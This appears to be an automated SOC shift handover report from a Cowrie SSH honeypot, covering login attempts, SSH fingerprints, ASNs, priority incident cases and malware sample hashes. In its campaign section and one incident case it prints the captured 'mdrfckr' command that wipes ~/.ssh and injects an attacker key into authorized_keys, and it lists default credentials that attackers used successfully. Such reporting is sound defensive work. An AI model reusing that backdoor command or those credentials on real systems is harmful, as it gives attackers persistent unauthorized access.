# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-25 |
| **Generated At** | 2026-10-25T02:12:16Z |
| **Shift Time** | 02:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **29** |
| Confirmed Threats | **24** |
| False Positives Filtered | **5** (17.2%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **11** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **17** |
| Malware Samples Analyzed | **8** HIGH · **25** MED · 3 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **81** |
| Unique Credential Pairs | **73** |
| Unique Usernames | **46** |
| Unique Passwords | **67** |
| Successful Auth Pairs | **74** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 21 |
| `admin` | 5 |
| `lghkel	` | 4 |
| `CONNECT www.google.com:443 HTTP/1.1` | 3 |
| `appuser` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `zpz}ld	` | 4 |
| `123456` | 3 |
| `Host: www.google.com:443` | 3 |
| `123` | 3 |
| `Abc123456789` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `lghkel	` | `zpz}ld	` | 4 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | 3 |
| `root` | `Abc123456789` | 2 |
| `admin` | `` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456a` | `2.57.122.150` | 2026-10-25T00:00:46 |
| `root` | `123456b` | `2.57.122.150` | 2026-10-25T00:02:41 |
| `support` | `support` | `176.53.159.196` | 2026-10-25T00:10:01 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xd7\xce\xdd\x89\x8f\xdf'` | `14.47.200.242` | 2026-10-25T00:18:42 |
| `lghkel	` | `zpz}ld	` | `14.47.200.242` | 2026-10-25T00:18:43 |
| `admin` | `ZmqVfoSIP` | `14.47.200.242` | 2026-10-25T00:19:16 |
| `"??$` | `hahb` | `14.47.200.242` | 2026-10-25T00:19:50 |
| `admin` | `epicrouter` | `14.47.200.242` | 2026-10-25T00:20:24 |
| `root` | `5up` | `14.47.200.242` | 2026-10-25T00:20:58 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\xdf\xda\xd3\xd7\xd0'` | `14.47.200.242` | 2026-10-25T00:21:32 |
| `"??$` | `14=9>` | `14.47.200.242` | 2026-10-25T00:22:06 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xdf\xd0\xd5\xd1'` | `14.47.200.242` | 2026-10-25T00:23:14 |
| `root` | `uClinux` | `14.47.200.242` | 2026-10-25T00:23:48 |
| `root` | `---fuck_you----` | `10.0.0.73` | 2026-10-25T00:25:57 |
| `root` | `Abc123456789` | `10.0.0.73` | 2026-10-25T00:31:11 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `138.124.124.212` | 2026-10-25T00:37:28 |
| `tamara` | `tamara` | `10.0.0.73` | 2026-10-25T00:40:10 |
| `CONNECT www.google.com:443 HTTP/1.1` | `Host: www.google.com:443` | `217.60.240.247` | 2026-10-25T00:40:34 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-10-25T00:41:26 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-10-25T00:41:29 |
_… 54 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **29** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 8 |
| libssh | 3 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 2 | 1 |
| `f555226df196...` | Mirai/variant | 2 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 2 | 2 |
| `eff4c24daffc...` | Modern SSH client | 1 | 1 |
| `7216c7c47391...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 2 | 1 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 2 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `4.184.246.230`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **11** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 11 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS198364` | BANATSYNC SRL | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | HIGH |
| `AS6939` | Hurricane Electric LLC | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS6789` | CRELCOM LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3aae933e7dd5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-10-25 00:00 |
| **Last Seen** | 2026-10-25 00:01 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f045e5b2a06a8557c13570b05b395e24_small_control'"'"' '"'"'check_f045e5b2a06a8557c13570b05b395e24'"'"'', printf '\n%s|%s\n' 'check_f045e5b2a06a8557c13570b05b395e24_small_control' 'check_f045e5b2a06a8557c13570b05b395e24', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f045e5b2a06a8557c13570b05b395e24_small_math'"'"' "$((693*334+12))"', (693*334+12, printf '\n%s|%s\n' 'check_f045e5b2a06a8557c13570b05b395e24_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:00:44` | `cowrie.session.connect` |
| `2026-10-25 00:00:44` | `cowrie.client.version` |
| `2026-10-25 00:00:44` | `cowrie.client.kex` |
| `2026-10-25 00:00:46` | `cowrie.login.success` |
| `2026-10-25 00:00:47` | `cowrie.client.size` |
| `2026-10-25 00:00:47` | `cowrie.session.params` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| `2026-10-25 00:00:48` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-560a860b0901

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-10-25 00:02 |
| **Last Seen** | 2026-10-25 00:03 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c66f5aef1c1a71d9f46a6f4f0efc1bc4_small_control'"'"' '"'"'check_c66f5aef1c1a71d9f46a6f4f0efc1bc4'"'"'', printf '\n%s|%s\n' 'check_c66f5aef1c1a71d9f46a6f4f0efc1bc4_small_control' 'check_c66f5aef1c1a71d9f46a6f4f0efc1bc4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_c66f5aef1c1a71d9f46a6f4f0efc1bc4_small_math'"'"' "$((950*487+69))"', (950*487+69, printf '\n%s|%s\n' 'check_c66f5aef1c1a71d9f46a6f4f0efc1bc4_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:02:39` | `cowrie.session.connect` |
| `2026-10-25 00:02:39` | `cowrie.client.version` |
| `2026-10-25 00:02:39` | `cowrie.client.kex` |
| `2026-10-25 00:02:41` | `cowrie.login.success` |
| `2026-10-25 00:02:42` | `cowrie.client.size` |
| `2026-10-25 00:02:42` | `cowrie.session.params` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| `2026-10-25 00:02:43` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b3044b1ce0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-25 00:10 |
| **Last Seen** | 2026-10-25 00:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:10:01` | `cowrie.session.connect` |
| `2026-10-25 00:10:01` | `cowrie.client.version` |
| `2026-10-25 00:10:01` | `cowrie.client.kex` |
| `2026-10-25 00:10:01` | `cowrie.login.success` |
| `2026-10-25 00:10:01` | `cowrie.direct-tcpip.request` |
| `2026-10-25 00:10:02` | `cowrie.direct-tcpip.data` |
| `2026-10-25 00:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8c85e3d209

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-10-25 00:18 |
| **Last Seen** | 2026-10-25 00:19 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:18:41` | `cowrie.session.connect` |
| `2026-10-25 00:18:42` | `cowrie.login.success` |
| `2026-10-25 00:18:43` | `cowrie.login.success` |
| `2026-10-25 00:18:43` | `cowrie.session.params` |
| `2026-10-25 00:18:43` | `cowrie.command.input` |
| `2026-10-25 00:18:43` | `cowrie.command.failed` |
| `2026-10-25 00:18:44` | `cowrie.command.input` |
| `2026-10-25 00:18:44` | `cowrie.command.failed` |
| `2026-10-25 00:18:44` | `cowrie.command.input` |
| `2026-10-25 00:18:44` | `cowrie.command.input` |
| `2026-10-25 00:18:44` | `cowrie.command.failed` |
| `2026-10-25 00:18:44` | `cowrie.command.failed` |
| `2026-10-25 00:19:15` | `cowrie.log.closed` |
| `2026-10-25 00:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad50bfba8e9

| Field | Detail |
|---|---|
| **Source IP** | `14.47.200[.]242` |
| **First Seen** | 2026-10-25 00:19 |
| **Last Seen** | 2026-10-25 00:19 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:19:15` | `cowrie.session.connect` |
| `2026-10-25 00:19:16` | `cowrie.login.success` |
| `2026-10-25 00:19:17` | `cowrie.session.params` |
| `2026-10-25 00:19:17` | `cowrie.command.input` |
| `2026-10-25 00:19:17` | `cowrie.command.failed` |
| `2026-10-25 00:19:18` | `cowrie.command.input` |
| `2026-10-25 00:19:18` | `cowrie.command.failed` |
| `2026-10-25 00:19:18` | `cowrie.command.input` |
| `2026-10-25 00:19:18` | `cowrie.command.failed` |
| `2026-10-25 00:19:18` | `cowrie.command.input` |
| `2026-10-25 00:19:18` | `cowrie.command.failed` |
| `2026-10-25 00:19:19` | `cowrie.command.input` |
| `2026-10-25 00:19:19` | `cowrie.command.input` |
| `2026-10-25 00:19:19` | `cowrie.command.failed` |
| `2026-10-25 00:19:19` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `14.47.200[.]242` to AbuseIPDB if not already reported
- [ ] Block `14.47.200[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b0ffa7a123

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-10-25 00:42 |
| **Last Seen** | 2026-10-25 00:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:42:46` | `cowrie.session.connect` |
| `2026-10-25 00:42:46` | `cowrie.client.version` |
| `2026-10-25 00:42:46` | `cowrie.client.kex` |
| `2026-10-25 00:42:46` | `cowrie.login.success` |
| `2026-10-25 00:42:47` | `cowrie.session.params` |
| `2026-10-25 00:42:47` | `cowrie.command.input` |
| `2026-10-25 00:42:47` | `cowrie.command.failed` |
| `2026-10-25 00:42:47` | `cowrie.log.closed` |
| `2026-10-25 00:42:48` | `cowrie.session.params` |
| `2026-10-25 00:42:48` | `cowrie.command.input` |
| `2026-10-25 00:42:48` | `cowrie.session.file_download` |
| `2026-10-25 00:42:48` | `cowrie.log.closed` |
| `2026-10-25 00:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0704a96141ef

| Field | Detail |
|---|---|
| **Source IP** | `4.184.246[.]230` |
| **First Seen** | 2026-10-25 00:42 |
| **Last Seen** | 2026-10-25 00:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:42:48` | `cowrie.session.connect` |
| `2026-10-25 00:42:48` | `cowrie.client.version` |
| `2026-10-25 00:42:48` | `cowrie.client.kex` |
| `2026-10-25 00:42:49` | `cowrie.login.success` |
| `2026-10-25 00:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.184.246[.]230` to AbuseIPDB if not already reported
- [ ] Block `4.184.246[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f013a140ae0b

| Field | Detail |
|---|---|
| **Source IP** | `179.43.153[.]2` |
| **First Seen** | 2026-10-25 00:46 |
| **Last Seen** | 2026-10-25 00:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:46:00` | `cowrie.session.connect` |
| `2026-10-25 00:46:00` | `cowrie.client.version` |
| `2026-10-25 00:46:00` | `cowrie.client.kex` |
| `2026-10-25 00:46:00` | `cowrie.login.success` |
| `2026-10-25 00:46:01` | `cowrie.session.params` |
| `2026-10-25 00:46:01` | `cowrie.command.input` |
| `2026-10-25 00:46:01` | `cowrie.log.closed` |
| `2026-10-25 00:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.43.153[.]2` to AbuseIPDB if not already reported
- [ ] Block `179.43.153[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2ee52fcb8b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]162` |
| **First Seen** | 2026-10-25 00:50 |
| **Last Seen** | 2026-10-25 00:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 00:50:42` | `cowrie.session.connect` |
| `2026-10-25 00:50:42` | `cowrie.client.version` |
| `2026-10-25 00:50:42` | `cowrie.client.kex` |
| `2026-10-25 00:50:43` | `cowrie.login.success` |
| `2026-10-25 00:50:44` | `cowrie.session.params` |
| `2026-10-25 00:50:44` | `cowrie.command.input` |
| `2026-10-25 00:50:45` | `cowrie.log.closed` |
| `2026-10-25 00:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]162` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]162` | 1 | 2026-10-25 00:49 | 2026-10-25 00:49 | 8s | 0 | `T1592` | 🟢 LOW |
| `115.28.198[.]131` | 1 | 2026-10-25 00:14 | 2026-10-25 00:14 | 35s | 0 | `T1592` | 🟢 LOW |
| `121.184.202[.]203` | 1 | 2026-10-25 00:42 | 2026-10-25 00:42 | 28s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-25 00:20 | 2026-10-25 00:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-10-25 00:35 | 2026-10-25 00:36 | 88s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-25 00:52 | 2026-10-25 00:53 | 40s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-10-25 00:32 | 2026-10-25 00:32 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-25 00:25 | 2026-10-25 00:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.43.153[.]2` | 1 | 2026-10-25 00:44 | 2026-10-25 00:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.212.228[.]238` | 1 | 2026-10-25 00:53 | 2026-10-25 00:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.146.185[.]132` | 1 | 2026-10-25 00:45 | 2026-10-25 00:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]236` | 1 | 2026-10-25 00:25 | 2026-10-25 00:25 | 4s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]20` | 1 | 2026-10-25 00:51 | 2026-10-25 00:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]95` | 1 | 2026-10-25 00:44 | 2026-10-25 00:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.101.110[.]215` | 1 | 2026-10-25 00:35 | 2026-10-25 00:35 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
